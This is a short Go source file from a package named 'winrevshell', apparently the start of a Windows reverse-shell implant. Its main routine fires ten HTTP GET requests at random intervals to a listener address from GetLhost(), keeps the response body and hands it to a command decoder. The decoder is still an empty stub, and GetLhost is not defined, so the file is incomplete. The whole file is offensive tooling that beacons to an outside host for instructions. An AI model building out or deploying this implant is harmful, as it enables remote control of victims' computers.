package winrevshell

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"time"

	sched "github.com/cenkalti/go-sched"
)

var GetRequestBody string

func client() {
	conn := http.Client{Timeout: time.Duration(1) * time.Second}
	resp, err := conn.Get(GetLhost())
	if err != nil {
		fmt.Printf("Error %s", err)
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	fmt.Printf("Body : %s", body)
	GetRequestBody = string(body)

	if body != nil {
		decodeServerRequest()
	}
}

func decodeServerRequest() {

}

func main() {
	r := rand.New(rand.NewSource(99))
	s := sched.New()

	for i := 0; i < 10; i++ {
		n := r.Intn(5)
		d := time.Duration(n) * time.Second
		s.Enter(d, client)
	}

	s.Run()
}
